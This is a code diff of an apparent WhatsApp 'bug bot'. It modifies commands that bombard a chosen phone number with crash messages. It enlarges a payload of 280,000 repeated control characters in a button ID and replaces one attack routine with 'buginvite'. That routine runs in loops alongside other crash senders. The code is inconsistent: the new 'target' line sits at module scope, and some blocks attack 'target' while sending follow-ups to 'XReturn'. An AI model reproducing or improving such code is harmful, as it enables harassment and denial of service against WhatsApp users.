@@ -48,6 +48,7 @@ const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
 const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`) 
 const zkosong = fs.readFileSync(`./database/image/zkosong.png`)
 const o = fs.readFileSync(`./database/image/o.jpg`)
+const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 
 const bugres = '𝙋𝙧𝙤𝙘𝙚𝙨𝙨 〽️'
 
@@ -603,7 +604,7 @@ quotedMessage: {
                     footerText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
                     buttons: [
                         {
-                            buttonId: "\u0003".repeat(180000),
+                            buttonId: "\u0003".repeat(280000),
                             buttonText: {
                                 displayText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"
                             },
@@ -2200,9 +2201,9 @@ if (!q) return reply(`Example: ${prefix + command} 62×××`);
 reply(bugres);
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, (cct = true), (Ptcp = true));
+await buginvite(target, { ptcp: true });
 await sleep(1500);
-await buk1(viper, target);
+await buginvite(target, { ptcp: true });
 await sleep(1500);
 sendQP(target, wanted);
 await sleep(1500);
@@ -2245,9 +2246,9 @@ var contactInfo = await viper.onWhatsApp(XReturn);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, XReturn, (cct = true), (Ptcp = true));
+await buginvite(target, { ptcp: true });
 await sleep(1500);
-await buk1(viper, XReturn);
+await buginvite(target, { ptcp: true });
 await sleep(1500);
 sendQP(XReturn, wanted);
 await sleep(1500);
@@ -2291,9 +2292,9 @@ var contactInfo = await viper.onWhatsApp(XReturn);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, XReturn, (cct = true), (Ptcp = true));
+await buginvite(target, { ptcp: true });
 await sleep(1500);
-await buk1(viper, XReturn);
+await buginvite(target, { ptcp: true });
 await sleep(1500);
 sendQP(XReturn, wanted);
 await sleep(1500);
@@ -2337,7 +2338,7 @@ var contactInfo = await viper.onWhatsApp(XReturn);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, XReturn, "Punten", 1020000, Ptcp = true);
+await buginvite(target, { ptcp: true });
 await sendQP(XReturn, wanted)
 await XeonXRobustV2(viper, XReturn, wanted)
 await sendSessionStructure(XReturn, wanted)
@@ -2371,9 +2372,9 @@ var contactInfo = await viper.onWhatsApp(XReturn);
 reply(bugres)
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, XReturn, (cct = true), (Ptcp = true));
+await buginvite(target, { ptcp: true });
 await sleep(1500);
-await buk1(viper, XReturn);
+await buginvite(target, { ptcp: true });
 await sleep(1500);
 sendQP(XReturn, wanted);
 await sleep(1500);
